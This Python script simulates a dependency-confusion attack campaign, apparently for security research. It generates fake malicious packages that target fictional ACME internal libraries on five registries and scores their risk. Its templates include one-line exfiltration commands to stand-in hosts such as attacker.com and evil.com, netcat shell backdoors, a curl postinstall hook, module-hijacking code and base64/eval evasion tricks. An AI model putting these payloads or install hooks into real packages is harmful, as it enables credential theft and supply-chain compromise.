#!/usr/bin/env python3
"""
Dependency Confusion Attack Simulation

This script simulates dependency confusion attacks where attackers upload
malicious packages with names matching internal/private packages to public
registries, exploiting package resolution vulnerabilities.
"""

import json
import os
import random
import string
import time
import hashlib
import base64
from datetime import datetime, timedelta
from typing import Dict, List, Any, Tuple
import requests
from dataclasses import dataclass, asdict

@dataclass
class InternalPackage:
    """Represents an internal/private package that could be targeted"""
    name: str
    registry: str
    version: str
    namespace: str
    description: str
    last_updated: str
    usage_frequency: int  # How often it's used internally
    criticality: str  # low, medium, high, critical

@dataclass
class MaliciousPackage:
    """Represents a malicious package designed for dependency confusion"""
    name: str
    registry: str
    version: str
    target_package: str
    payload_type: str
    payload: str
    metadata: Dict[str, Any]
    upload_timestamp: str
    attack_vector: str
    risk_score: float
    evasion_techniques: List[str]

class DependencyConfusionSimulator:
    def __init__(self):
        self.output_dir = os.path.join(os.path.dirname(__file__), 'dependency-confusion-artifacts')
        self.ensure_output_dir()
        
        # Simulated internal packages across different registries
        self.internal_packages = self.generate_internal_packages()
        
        # Malicious payload templates
        self.payload_templates = {
            'data_exfiltration': [
                'import os; import requests; requests.post("http://attacker.com/exfil", data=os.environ)',
                'const fs = require("fs"); const https = require("https"); https.request("https://evil.com/steal", {method: "POST", headers: {"Content-Type": "application/json"}}).write(JSON.stringify(process.env));',
                'System.Net.WebClient().UploadString("http://malicious.com/data", Environment.GetEnvironmentVariables().ToString());',
                'require "net/http"; Net::HTTP.post_form(URI("http://evil.com/ruby"), ENV.to_h)',
                'package main; import ("net/http"; "os"; "strings"); http.Post("http://attacker.com/go", "application/json", strings.NewReader(os.Environ().String()))'
            ],
            'credential_theft': [
                'import keyring; import requests; requests.post("http://stealer.com", json={"creds": keyring.get_keyring()})',
                'const keytar = require("keytar"); fetch("http://cred-stealer.com", {method: "POST", body: JSON.stringify(keytar.getPassword("*", "*"))});',
                'using System.Security.Cryptography; /* credential extraction code */',
                'require "win32/registry"; # Windows credential extraction',
                'import "golang.org/x/crypto/ssh"; // SSH key extraction'
            ],
            'backdoor': [
                'import subprocess; subprocess.Popen(["nc", "-l", "-p", "4444", "-e", "/bin/sh"])',
                'require("child_process").spawn("nc", ["-l", "4444", "-e", "/bin/sh"]);',
                'System.Diagnostics.Process.Start("cmd.exe", "/c nc -l -p 4444 -e cmd.exe");',
                'system("nc -l 4444 -e /bin/sh")',
                'exec.Command("nc", "-l", "4444", "-e", "/bin/sh").Start()'
            ],
            'supply_chain_poison': [
                'import sys; sys.modules["requests"] = __import__("malicious_requests")',
                'const Module = require("module"); const originalRequire = Module.prototype.require; Module.prototype.require = function(id) { if (id === "axios") return require("malicious-axios"); return originalRequire.apply(this, arguments); };',
                'AppDomain.CurrentDomain.AssemblyResolve += (sender, args) => { if (args.Name.Contains("Newtonsoft.Json")) return Assembly.LoadFrom("malicious.dll"); return null; };',
                'module Kernel; alias_method :original_require, :require; def require(name); return load("malicious.rb") if name == "json"; original_require(name); end; end',
                'package main; import "plugin"; func init() { plugin.Open("malicious.so") }'
            ]
        }
        
        # Evasion techniques
        self.evasion_techniques = [
            'version_bumping',
            'metadata_spoofing',
            'delayed_activation',
            'environment_detection',
            'obfuscation',
            'legitimate_functionality',
            'typo_variations',
            'namespace_confusion'
        ]
    
    def ensure_output_dir(self):
        """Create output directory if it doesn't exist"""
        os.makedirs(self.output_dir, exist_ok=True)
    
    def generate_internal_packages(self) -> List[InternalPackage]:
        """Generate a realistic set of internal packages that could be targeted"""
        packages = []
        
        # NPM packages
        npm_packages = [
            ('acme-auth-lib', 'Authentication library for ACME services'),
            ('acme-config-manager', 'Configuration management utility'),
            ('acme-logger', 'Internal logging framework'),
            ('acme-api-client', 'Internal API client library'),
            ('acme-utils', 'Common utility functions'),
            ('acme-db-connector', 'Database connection library'),
            ('acme-crypto-utils', 'Cryptographic utilities'),
            ('acme-monitoring', 'Internal monitoring tools'),
            ('acme-cache-manager', 'Caching layer implementation'),
            ('acme-message-queue', 'Message queue client')
        ]
        
        for name, desc in npm_packages:
            packages.append(InternalPackage(
                name=name,
                registry='npm',
                version=f"{random.randint(1, 5)}.{random.randint(0, 20)}.{random.randint(0, 50)}",
                namespace='@acme',
                description=desc,
                last_updated=(datetime.now() - timedelta(days=random.randint(1, 365))).isoformat(),
                usage_frequency=random.randint(10, 1000),
                criticality=random.choice(['low', 'medium', 'high', 'critical'])
            ))
        
        # PyPI packages
        pypi_packages = [
            ('acme-auth', 'Python authentication library'),
            ('acme-config', 'Configuration management'),
            ('acme-logging', 'Logging framework'),
            ('acme-api', 'API client library'),
            ('acme-common', 'Common utilities'),
            ('acme-database', 'Database utilities'),
            ('acme-security', 'Security utilities'),
            ('acme-monitoring', 'Monitoring tools'),
            ('acme-cache', 'Caching utilities'),
            ('acme-queue', 'Queue management')
        ]
        
        for name, desc in pypi_packages:
            packages.append(InternalPackage(
                name=name,
                registry='pypi',
                version=f"{random.randint(0, 2)}.{random.randint(0, 20)}.{random.randint(0, 50)}",
                namespace='acme',
                description=desc,
                last_updated=(datetime.now() - timedelta(days=random.randint(1, 365))).isoformat(),
                usage_frequency=random.randint(5, 500),
                criticality=random.choice(['low', 'medium', 'high', 'critical'])
            ))
        
        # Maven packages
        maven_packages = [
            ('acme-auth-core', 'Core authentication library'),
            ('acme-config-api', 'Configuration API'),
            ('acme-logging-framework', 'Logging framework'),
            ('acme-rest-client', 'REST client library'),
            ('acme-common-utils', 'Common utilities'),
            ('acme-data-access', 'Data access layer'),
            ('acme-security-core', 'Security core library'),
            ('acme-metrics', 'Metrics collection'),
            ('acme-cache-api', 'Caching API'),
            ('acme-messaging', 'Messaging framework')
        ]
        
        for name, desc in maven_packages:
            packages.append(InternalPackage(
                name=name,
                registry='maven',
                version=f"{random.randint(1, 10)}.{random.randint(0, 50)}.{random.randint(0, 100)}",
                namespace='com.acme',
                description=desc,
                last_updated=(datetime.now() - timedelta(days=random.randint(1, 365))).isoformat(),
                usage_frequency=random.randint(20, 800),
                criticality=random.choice(['low', 'medium', 'high', 'critical'])
            ))
        
        # NuGet packages
        nuget_packages = [
            ('Acme.Authentication', 'Authentication library'),
            ('Acme.Configuration', 'Configuration management'),
            ('Acme.Logging', 'Logging framework'),
            ('Acme.ApiClient', 'API client library'),
            ('Acme.Common', 'Common utilities'),
            ('Acme.DataAccess', 'Data access utilities'),
            ('Acme.Security', 'Security utilities'),
            ('Acme.Monitoring', 'Monitoring tools'),
            ('Acme.Caching', 'Caching framework'),
            ('Acme.Messaging', 'Messaging utilities')
        ]
        
        for name, desc in nuget_packages:
            packages.append(InternalPackage(
                name=name,
                registry='nuget',
                version=f"{random.randint(1, 5)}.{random.randint(0, 20)}.{random.randint(0, 50)}.{random.randint(0, 1000)}",
                namespace='Acme',
                description=desc,
                last_updated=(datetime.now() - timedelta(days=random.randint(1, 365))).isoformat(),
                usage_frequency=random.randint(15, 600),
                criticality=random.choice(['low', 'medium', 'high', 'critical'])
            ))
        
        # RubyGems packages
        rubygems_packages = [
            ('acme-auth', 'Authentication gem'),
            ('acme-config', 'Configuration gem'),
            ('acme-logger', 'Logging gem'),
            ('acme-api-client', 'API client gem'),
            ('acme-utils', 'Utility gem'),
            ('acme-db', 'Database gem'),
            ('acme-security', 'Security gem'),
            ('acme-monitor', 'Monitoring gem'),
            ('acme-cache', 'Caching gem'),
            ('acme-queue', 'Queue gem')
        ]
        
        for name, desc in rubygems_packages:
            packages.append(InternalPackage(
                name=name,
                registry='rubygems',
                version=f"{random.randint(0, 3)}.{random.randint(0, 20)}.{random.randint(0, 50)}",
                namespace='acme',
                description=desc,
                last_updated=(datetime.now() - timedelta(days=random.randint(1, 365))).isoformat(),
                usage_frequency=random.randint(10, 400),
                criticality=random.choice(['low', 'medium', 'high', 'critical'])
            ))
        
        return packages
    
    def generate_malicious_version(self, target_version: str) -> str:
        """Generate a malicious version that would be preferred over the internal version"""
        parts = target_version.split('.')
        major = int(parts[0])
        minor = int(parts[1]) if len(parts) > 1 else 0
        patch = int(parts[2]) if len(parts) > 2 else 0
        
        # Strategy 1: Bump major version
        if random.random() < 0.4:
            return f"{major + 1}.0.0"
        
        # Strategy 2: Bump minor version significantly
        elif random.random() < 0.7:
            return f"{major}.{minor + random.randint(10, 50)}.0"
        
        # Strategy 3: Use a very high version number
        else:
            return f"{major + random.randint(5, 20)}.{random.randint(50, 200)}.{random.randint(100, 500)}"
    
    def generate_evasive_metadata(self, target_package: InternalPackage) -> Dict[str, Any]:
        """Generate metadata that looks legitimate but contains malicious elements"""
        registry_templates = {
            'npm': {
                'main': 'index.js',
                'scripts': {
                    'test': 'echo "Error: no test specified" && exit 1',
                    'preinstall': 'node -e "console.log(\'Installing dependencies...\')"',
                    'postinstall': 'node -e "console.log(\'Installation complete\')"'
                },
                'keywords': ['acme', 'enterprise', 'internal', 'library'],
                'license': 'MIT',
                'repository': {
                    'type': 'git',
                    'url': f'https://github.com/acme-corp/{target_package.name}'
                }
            },
            'pypi': {
                'author': 'ACME Development Team',
                'author_email': 'dev@acme.com',
                'license': 'MIT',
                'classifiers': [
                    'Development Status :: 5 - Production/Stable',
                    'Intended Audience :: Developers',
                    'License :: OSI Approved :: MIT License',
                    'Programming Language :: Python :: 3'
                ],
                'install_requires': ['requests', 'setuptools'],
                'setup_requires': ['setuptools>=40.0']
            },
            'maven': {
                'groupId': 'com.acme',
                'packaging': 'jar',
                'properties': {
                    'maven.compiler.source': '11',
                    'maven.compiler.target': '11'
                },
                'dependencies': [
                    {'groupId': 'org.springframework', 'artifactId': 'spring-core'},
                    {'groupId': 'com.fasterxml.jackson.core', 'artifactId': 'jackson-core'}
                ]
            },
            'nuget': {
                'authors': 'ACME Corporation',
                'owners': 'ACME Corporation',
                'licenseUrl': 'https://opensource.org/licenses/MIT',
                'projectUrl': f'https://github.com/acme-corp/{target_package.name}',
                'requireLicenseAcceptance': False,
                'tags': 'acme enterprise internal library',
                'dependencies': {
                    'Newtonsoft.Json': '13.0.1',
                    'Microsoft.Extensions.Logging': '6.0.0'
                }
            },
            'rubygems': {
                'authors': ['ACME Development Team'],
                'email': 'dev@acme.com',
                'homepage': f'https://github.com/acme-corp/{target_package.name}',
                'license': 'MIT',
                'required_ruby_version': '>= 2.7.0',
                'dependencies': {
                    'json': '~> 2.0',
                    'net-http': '~> 0.3'
                }
            }
        }
        
        base_metadata = registry_templates.get(target_package.registry, {})
        
        # Add malicious elements disguised as legitimate functionality
        if target_package.registry == 'npm':
            # Malicious postinstall script
            base_metadata['scripts']['postinstall'] = 'node -e "require(\'child_process\').exec(\'curl -s http://malicious.com/npm-install\')"'
        elif target_package.registry == 'pypi':
            # Malicious setup.py commands
            base_metadata['cmdclass'] = {'install': 'CustomInstallCommand'}
        
        return base_metadata
    
    def select_payload(self, payload_type: str, registry: str) -> str:
        """Select an appropriate payload based on type and registry"""
        registry_index = {
            'pypi': 0,
            'npm': 1,
            'nuget': 2,
            'rubygems': 3,
            'maven': 4
        }
        
        templates = self.payload_templates.get(payload_type, self.payload_templates['data_exfiltration'])
        index = registry_index.get(registry, 0)
        
        if index < len(templates):
            return templates[index]
        else:
            return templates[0]
    
    def apply_evasion_techniques(self, package: MaliciousPackage) -> List[str]:
        """Apply various evasion techniques to make detection harder"""
        applied_techniques = []
        
        # Version bumping (already applied in version generation)
        applied_techniques.append('version_bumping')
        
        # Metadata spoofing (already applied in metadata generation)
        applied_techniques.append('metadata_spoofing')
        
        # Delayed activation
        if random.random() < 0.3:
            delay_payload = f"setTimeout(() => {{ {package.payload} }}, {random.randint(24, 168)} * 3600 * 1000);"
            package.payload = delay_payload
            applied_techniques.append('delayed_activation')
        
        # Environment detection
        if random.random() < 0.4:
            env_check = "if (process.env.NODE_ENV === 'production' || process.env.CI) {"
            package.payload = f"{env_check} {package.payload} }}"
            applied_techniques.append('environment_detection')
        
        # Obfuscation
        if random.random() < 0.5:
            obfuscated = base64.b64encode(package.payload.encode()).decode()
            package.payload = f"eval(atob('{obfuscated}'))"
            applied_techniques.append('obfuscation')
        
        # Add legitimate functionality
        if random.random() < 0.6:
            legit_func = "function legitimateFunction() { return 'Hello World'; }"
            package.payload = f"{legit_func}\n{package.payload}"
            applied_techniques.append('legitimate_functionality')
        
        return applied_techniques
    
    def calculate_risk_score(self, package: MaliciousPackage, target: InternalPackage) -> float:
        """Calculate risk score based on various factors"""
        score = 0.0
        
        # Base score from target criticality
        criticality_scores = {'low': 2, 'medium': 4, 'high': 7, 'critical': 10}
        score += criticality_scores.get(target.criticality, 2)
        
        # Usage frequency impact
        if target.usage_frequency > 500:
            score += 3
        elif target.usage_frequency > 100:
            score += 2
        else:
            score += 1
        
        # Payload type impact
        payload_scores = {
            'data_exfiltration': 3,
            'credential_theft': 4,
            'backdoor': 4,
            'supply_chain_poison': 5
        }
        score += payload_scores.get(package.payload_type, 2)
        
        # Evasion techniques impact
        evasion_bonus = len(package.evasion_techniques) * 0.5
        score += evasion_bonus
        
        # Registry-specific factors
        registry_multipliers = {
            'npm': 1.2,  # High adoption, easy to publish
            'pypi': 1.1,  # High adoption, moderate security
            'maven': 0.9,  # More controlled environment
            'nuget': 1.0,  # Balanced
            'rubygems': 1.0  # Balanced
        }
        score *= registry_multipliers.get(package.registry, 1.0)
        
        return min(10.0, score)
    
    def generate_attack_package(self, target: InternalPackage) -> MaliciousPackage:
        """Generate a malicious package targeting the given internal package"""
        payload_type = random.choice(list(self.payload_templates.keys()))
        payload = self.select_payload(payload_type, target.registry)
        
        # Generate attack variations
        attack_vectors = [
            'exact_name_match',
            'namespace_confusion',
            'typo_variation',
            'similar_name'
        ]
        
        attack_vector = random.choice(attack_vectors)
        
        if attack_vector == 'exact_name_match':
            malicious_name = target.name
        elif attack_vector == 'namespace_confusion':
            malicious_name = target.name.replace('acme-', '').replace('acme_', '').replace('Acme.', '')
        elif attack_vector == 'typo_variation':
            # Create subtle typos
            variations = [
                target.name.replace('acme', 'acmee'),
                target.name.replace('-', '_'),
                target.name.replace('_', '-'),
                target.name + '-utils',
                target.name + '-extra'
            ]
            malicious_name = random.choice(variations)
        else:  # similar_name
            similar_names = [
                target.name.replace('acme', 'acme-corp'),
                target.name.replace('acme', 'acme-official'),
                target.name + '-community',
                target.name + '-enhanced'
            ]
            malicious_name = random.choice(similar_names)
        
        malicious_version = self.generate_malicious_version(target.version)
        metadata = self.generate_evasive_metadata(target)
        
        package = MaliciousPackage(
            name=malicious_name,
            registry=target.registry,
            version=malicious_version,
            target_package=target.name,
            payload_type=payload_type,
            payload=payload,
            metadata=metadata,
            upload_timestamp=datetime.now().isoformat(),
            attack_vector=attack_vector,
            risk_score=0.0,  # Will be calculated
            evasion_techniques=[]
        )
        
        # Apply evasion techniques
        package.evasion_techniques = self.apply_evasion_techniques(package)
        
        # Calculate risk score
        package.risk_score = self.calculate_risk_score(package, target)
        
        return package
    
    def simulate_dependency_confusion_campaign(self) -> List[MaliciousPackage]:
        """Simulate a comprehensive dependency confusion attack campaign"""
        print("🎯 Simulating Dependency Confusion Attack Campaign...")
        
        malicious_packages = []
        
        # Target high-value internal packages
        high_value_targets = [
            pkg for pkg in self.internal_packages 
            if pkg.criticality in ['high', 'critical'] or pkg.usage_frequency > 200
        ]
        
        # Generate attacks for high-value targets
        for target in high_value_targets:
            # Generate multiple attack variations per target
            num_variations = random.randint(1, 3)
            for _ in range(num_variations):
                malicious_pkg = self.generate_attack_package(target)
                malicious_packages.append(malicious_pkg)
        
        # Also target some medium-value packages for broader coverage
        medium_value_targets = [
            pkg for pkg in self.internal_packages 
            if pkg.criticality == 'medium' and pkg.usage_frequency > 50
        ]
        
        selected_medium = random.sample(
            medium_value_targets, 
            min(len(medium_value_targets), 10)
        )
        
        for target in selected_medium:
            malicious_pkg = self.generate_attack_package(target)
            malicious_packages.append(malicious_pkg)
        
        print(f"✅ Generated {len(malicious_packages)} malicious packages targeting {len(set(pkg.target_package for pkg in malicious_packages))} internal packages")
        
        return malicious_packages
    
    def analyze_attack_effectiveness(self, packages: List[MaliciousPackage]) -> Dict[str, Any]:
        """Analyze the effectiveness and detectability of the attack"""
        analysis = {
            'total_packages': len(packages),
            'registries_targeted': len(set(pkg.registry for pkg in packages)),
            'attack_vectors': {},
            'payload_types': {},
            'risk_distribution': {'low': 0, 'medium': 0, 'high': 0, 'critical': 0},
            'evasion_techniques': {},
            'detection_challenges': {
                'exact_name_matches': 0,
                'high_version_numbers': 0,
                'legitimate_metadata': 0,
                'delayed_payloads': 0,
                'obfuscated_payloads': 0
            },
            'target_analysis': {
                'critical_targets': 0,
                'high_usage_targets': 0,
                'multiple_variations': 0
            }
        }
        
        # Count attack vectors
        for pkg in packages:
            analysis['attack_vectors'][pkg.attack_vector] = analysis['attack_vectors'].get(pkg.attack_vector, 0) + 1
            analysis['payload_types'][pkg.payload_type] = analysis['payload_types'].get(pkg.payload_type, 0) + 1
            
            # Risk distribution
            if pkg.risk_score >= 8:
                analysis['risk_distribution']['critical'] += 1
            elif pkg.risk_score >= 6:
                analysis['risk_distribution']['high'] += 1
            elif pkg.risk_score >= 4:
                analysis['risk_distribution']['medium'] += 1
            else:
                analysis['risk_distribution']['low'] += 1
            
            # Evasion techniques
            for technique in pkg.evasion_techniques:
                analysis['evasion_techniques'][technique] = analysis['evasion_techniques'].get(technique, 0) + 1
            
            # Detection challenges
            if pkg.attack_vector == 'exact_name_match':
                analysis['detection_challenges']['exact_name_matches'] += 1
            
            if 'delayed_activation' in pkg.evasion_techniques:
                analysis['detection_challenges']['delayed_payloads'] += 1
            
            if 'obfuscation' in pkg.evasion_techniques:
                analysis['detection_challenges']['obfuscated_payloads'] += 1
        
        # Target analysis
        target_counts = {}
        for pkg in packages:
            target_counts[pkg.target_package] = target_counts.get(pkg.target_package, 0) + 1
        
        analysis['target_analysis']['multiple_variations'] = sum(1 for count in target_counts.values() if count > 1)
        
        return analysis
    
    def save_simulation_results(self, packages: List[MaliciousPackage], analysis: Dict[str, Any]) -> str:
        """Save simulation results to files"""
        timestamp = int(time.time())
        
        # Save detailed package data
        packages_file = os.path.join(self.output_dir, f'dependency-confusion-packages-{timestamp}.json')
        packages_data = {
            'timestamp': datetime.now().isoformat(),
            'total_packages': len(packages),
            'packages': [asdict(pkg) for pkg in packages]
        }
        
        with open(packages_file, 'w') as f:
            json.dump(packages_data, f, indent=2)
        
        # Save analysis report
        analysis_file = os.path.join(self.output_dir, f'dependency-confusion-analysis-{timestamp}.json')
        analysis_data = {
            'timestamp': datetime.now().isoformat(),
            'simulation_type': 'dependency_confusion',
            'analysis': analysis,
            'internal_packages': [asdict(pkg) for pkg in self.internal_packages]
        }
        
        with open(analysis_file, 'w') as f:
            json.dump(analysis_data, f, indent=2)
        
        print(f"💾 Simulation results saved:")
        print(f"   Packages: {packages_file}")
        print(f"   Analysis: {analysis_file}")
        
        return analysis_file
    
    def run_simulation(self) -> Dict[str, Any]:
        """Run the complete dependency confusion simulation"""
        print("🚨 Starting Dependency Confusion Attack Simulation")
        print("=" * 60)
        
        # Generate malicious packages
        malicious_packages = self.simulate_dependency_confusion_campaign()
        
        # Analyze attack effectiveness
        analysis = self.analyze_attack_effectiveness(malicious_packages)
        
        # Save results
        analysis_file = self.save_simulation_results(malicious_packages, analysis)
        
        # Print summary
        print("\n📊 Dependency Confusion Attack Summary:")
        print(f"Total malicious packages: {analysis['total_packages']}")
        print(f"Registries targeted: {analysis['registries_targeted']}")
        print(f"Critical risk packages: {analysis['risk_distribution']['critical']}")
        print(f"Exact name matches: {analysis['detection_challenges']['exact_name_matches']}")
        print(f"Packages with evasion: {sum(analysis['evasion_techniques'].values())}")
        
        return {
            'packages': malicious_packages,
            'analysis': analysis,
            'analysis_file': analysis_file
        }

if __name__ == '__main__':
    simulator = DependencyConfusionSimulator()
    results = simulator.run_simulation()